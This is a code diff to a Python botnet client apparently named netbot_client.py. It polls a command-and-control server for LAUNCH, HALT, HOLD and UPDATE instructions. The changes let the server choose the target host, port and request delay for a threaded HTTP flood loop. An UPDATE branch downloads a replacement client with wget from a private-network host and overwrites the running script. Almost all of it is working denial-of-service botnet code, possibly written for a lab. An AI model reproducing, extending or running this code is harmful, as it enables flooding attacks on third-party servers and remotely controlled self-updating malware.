@@ -28,9 +28,14 @@ class launchAttack:
       
 	def run(self, n):
 		while self._running and attackSet:
+
+			url_attack = 'http://'+n[0]+':'+n[1]+'/'
+
 			#r = requests.get("http://192.168.0.151/")
-			u = urllib.request.urlopen("http://192.168.0.151/").read()
-			time.sleep(0)
+			u = urllib.request.urlopen(url_attack).read()
+			#print("Value ", n)
+			#print("URL", url_attack)
+			time.sleep(int(n[4]))
 
 
 def Main():
@@ -68,19 +73,28 @@ def Main():
 		data = s.recv(1024)
 
 		# print the received message
-		print('CCC Response:',str(data.decode()))
-		
+		#print('CCC Response:',str(data.decode()))
+
 		data = str(data.decode())
 		data = data.split('_')
+		#print('CCC Response: ', data)  #check list empty code
+		if len(data) > 1:
+			
+			attStatus = data[2]
+			attHost = data[0]
+			attPort = data[1]
+		else:
+			attStatus = "OFFLINE"
+			
+
+		print('CCC Response: ', attStatus)
 		
-		print(data[2]);
-		
-		if data == "LAUNCH":
+		if attStatus == "LAUNCH":
 			if attackSet == 0:
 				# start a new thread and start the attack (create a new process)
 				attackSet = 1
 				c = launchAttack()
-				t = threading.Thread(target = c.run, args =(10, ))
+				t = threading.Thread(target = c.run, args =(data, ))
 				t.start()
 				
 			else:
@@ -89,15 +103,15 @@ def Main():
 					print('Attack in Progress...')
 			#else: 
 			continue
-		elif data == "HALT":
+		elif attStatus == "HALT":
 			attackSet = 0
 			time.sleep(30)
 			continue
-		elif data == "HOLD":
+		elif attStatus == "HOLD":
 			attackSet = 0
 			print('Waiting for Instructions from CCC. Retrying in 30 seconds...')
 			time.sleep(30)
-		elif data == "UPDATE":
+		elif attStatus == "UPDATE":
 			if updated == 0:
 				attackSet = 0
 				os.system('wget -N http://192.168.0.174/netbot_client.py -O netbot_client.py > /dev/null 2>&1')
